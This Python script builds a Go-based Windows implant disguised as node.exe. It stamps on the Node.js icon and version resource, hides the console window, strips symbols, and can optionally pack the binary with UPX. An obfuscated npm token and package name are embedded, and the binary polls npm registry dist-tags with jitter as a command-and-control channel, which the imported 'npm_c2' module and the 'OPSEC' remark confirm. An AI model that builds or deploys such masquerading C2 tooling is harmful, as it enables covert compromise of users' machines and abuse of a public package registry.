#!/usr/bin/env python3
"""Build node.exe from the Go source.

Cross-compiles from Linux (or any host with a Go toolchain) in about a second,
with the Node.js icon, version resource and manifest baked in.

    python3 native/build_go.py                                  # production
    python3 native/build_go.py -t npm_xxx -p npx-telemetry-collector
    python3 native/build_go.py --api-base http://127.0.0.1:8080  # tests
    python3 native/build_go.py --64 --32                         # both arches

Output: dist/node.exe (and dist/node-x86.exe with --32).
"""
from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
GO_DIR = os.path.join(ROOT, "go")
RES_DIR = os.path.join(GO_DIR, "resource")
sys.path.insert(0, os.path.join(ROOT, "src"))

ICON = os.path.join(HERE, "assets", "node.ico")
RC = os.path.join(RES_DIR, "node.rc")

ARCH = {
    "amd64": {"goarch": "amd64", "windres": "x86_64-w64-mingw32-windres",
              "syso": "rsrc_windows_amd64.syso", "suffix": ""},
    "386": {"goarch": "386", "windres": "i686-w64-mingw32-windres",
            "syso": "rsrc_windows_386.syso", "suffix": "-x86"},
}


def log(msg):
    print(msg, flush=True)


def make_resources(arch_key):
    cfg = ARCH[arch_key]
    syso = os.path.join(RES_DIR, cfg["syso"])
    windres = shutil.which(cfg["windres"])
    if windres is None:
        raise SystemExit(f"missing {cfg['windres']}: apt install gcc-mingw-w64")
    shutil.copy2(ICON, os.path.join(RES_DIR, "node.ico"))
    log(f"[+] resources ({arch_key})")
    subprocess.run([windres, "-I", RES_DIR, RC, "-O", "coff", "-o", syso],
                   check=True)
    # go build only picks up a .syso at the package root
    shutil.copy2(syso, os.path.join(GO_DIR, cfg["syso"]))


def pack_upx(path):
    """Compress the PE with UPX. Returns (before, after) or None if absent."""
    upx = shutil.which("upx")
    if upx is None:
        return None
    before = os.path.getsize(path)
    p = subprocess.run([upx, "--best", "--lzma", "-q", path],
                       capture_output=True, text=True)
    if p.returncode != 0:
        sys.stderr.write(f"[!] upx failed: {p.stderr[-400:]}\n")
        return None
    return before, os.path.getsize(path)


def build(token=None, package=None, api_base=None, arch_key="amd64",
          outdir=None, name="node", strip=True, interval=60, jitter=20,
          upx=False, tag_value="1.0.0"):
    if token and not package:
        raise SystemExit("--package is required with --token")

    api_tmpl = (api_base or "https://registry.npmjs.org") + "/-/package/%s/dist-tags"
    emb = ""
    if token and package:
        from npm_c2 import obfuscate_token
        emb = obfuscate_token(token, package)

    make_resources(arch_key)
    cfg = ARCH[arch_key]
    out = outdir or os.path.join(ROOT, "native", "dist")
    os.makedirs(out, exist_ok=True)
    target = os.path.join(out, f"{name}{cfg['suffix']}.exe")

    # The whole configuration goes into the binary: a deployed node.exe must
    # run with no arguments at all.
    ldflags = [
        "-X", f"main.apiTemplate={api_tmpl}",
        "-X", f"main.embeddedToken={emb}",
        "-X", f"main.embeddedPkg={package or ''}",
        "-X", f"main.embeddedEvery={int(interval)}",
        "-X", f"main.embeddedJit={int(jitter)}",
        "-X", f"main.tagValue={tag_value}",
        "-H", "windowsgui",
    ]
    if strip:
        ldflags = ["-s", "-w"] + ldflags

    cmd = ["go", "build", "-trimpath", "-ldflags", " ".join(ldflags),
           "-o", target, "."]
    env = dict(os.environ, CGO_ENABLED="0", GOOS="windows", GOARCH=cfg["goarch"])
    log(f"[+] go build {cfg['goarch']} -> {target}")
    p = subprocess.run(cmd, cwd=GO_DIR, env=env, capture_output=True, text=True)
    syso = os.path.join(GO_DIR, cfg["syso"])
    if os.path.exists(syso):
        os.remove(syso)          # never let it leak into a linux build
    if p.returncode != 0:
        sys.stderr.write((p.stdout or "")[-3000:] + (p.stderr or "")[-3000:])
        raise SystemExit("go build failed")
    if not os.path.exists(target):
        raise SystemExit(f"go build reported success but {target} is missing")
    size = os.path.getsize(target)
    if upx:
        packed = pack_upx(target)
        if packed:
            before, after = packed
            log(f"[+] upx: {before:,} -> {after:,} bytes ({after / before * 100:.1f}%)")
        else:
            log("[!] upx not found: leaving the binary unpacked")
    final = os.path.getsize(target)
    log(f"[+] {target} ({final:,} bytes)")
    return target


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", "-t")
    ap.add_argument("--package", "-p")
    ap.add_argument("--api-base", help="registry base URL (tests)")
    ap.add_argument("--name", default="node")
    ap.add_argument("--outdir")
    ap.add_argument("--interval", type=int, default=60,
                    help="poll interval baked into the binary (default 60)")
    ap.add_argument("--jitter", type=int, default=20,
                    help="jitter baked into the binary (default 20)")
    ap.add_argument("--tag-value", default="1.0.0",
                    help="version the dist-tags point at; must exist in the "
                         "package (staged-first packages use 0.0.0-stage)")
    ap.add_argument("--upx", action="store_true",
                    help="compress with UPX (~31%% of the size; hurts OPSEC)")
    ap.add_argument("--32", dest="x86", action="store_true", help="also build 386")
    ap.add_argument("--no-strip", action="store_true")
    a = ap.parse_args()
    if not a.package:
        raise SystemExit("--package/-p is required: the binary carries it")
    build(a.token, a.package, a.api_base, "amd64", a.outdir, a.name,
          strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx,
          tag_value=a.tag_value)
    if a.x86:
        build(a.token, a.package, a.api_base, "386", a.outdir, a.name,
              strip=not a.no_strip, interval=a.interval, jitter=a.jitter,
              upx=a.upx, tag_value=a.tag_value)


if __name__ == "__main__":
    main()
